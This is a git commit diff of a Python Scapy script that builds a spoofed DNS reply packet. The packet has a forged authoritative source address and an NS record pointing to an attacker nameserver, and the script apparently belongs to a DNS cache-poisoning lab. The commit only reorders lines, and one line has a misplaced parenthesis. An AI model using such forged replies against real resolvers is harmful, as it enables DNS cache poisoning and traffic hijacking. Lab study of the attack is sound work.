11d2d6b01bbfaf43e15527f4b3ebee935684143f
Lenny Adams <54559335+LennyAtomz138@users.noreply.github.com>
2021-03-07 16:54:55 -0500

    Update spoofdnsreply.py
    Moved things around for clarity.

--- remote/spoofdnsreply.py
+++ remote/spoofdnsreply.py
@@ -5,14 +5,17 @@ f=open("ip_resp.bin", "wb")
 name=("twysw.example.com")
 domain="example.com"
 ns='ns.attacker32.com'
+
 # Qdsec -> Query Destination Section
 Qdsec = DNSQR(qname=name) 
 # Anssec -> Answer Section
 Anssec = DNSRR(rrname=name), type='A', rdata="1.2.3.4", ttl=259200)
 # NSsec -> Name Server Section
 NSsec = DNSRR(rrname=domain, type="NS", rdata=ns, ttl=259200)
-DNSpkt=DNS(id=0xAAAA, aa=1, rd=1, qr=1, qdcount=1, ancount=1, nscount=1, arcount=0, qd=Qdsec, an=Anssec, ns=NSsec)
+
 IPpkt=IP(dst="serverIPaddress", src="199.43.133.53") #replace to match with your VM
 UDPpkt=UDP(dport=33333, sport=53, chksum=0)
+DNSpkt=DNS(id=0xAAAA, aa=1, rd=1, qr=1, qdcount=1, ancount=1, nscount=1, arcount=0, qd=Qdsec, an=Anssec, ns=NSsec)
+
 reply=IPpkt/UDPpkt/DNSpkt
 f.write(bytes(reply))
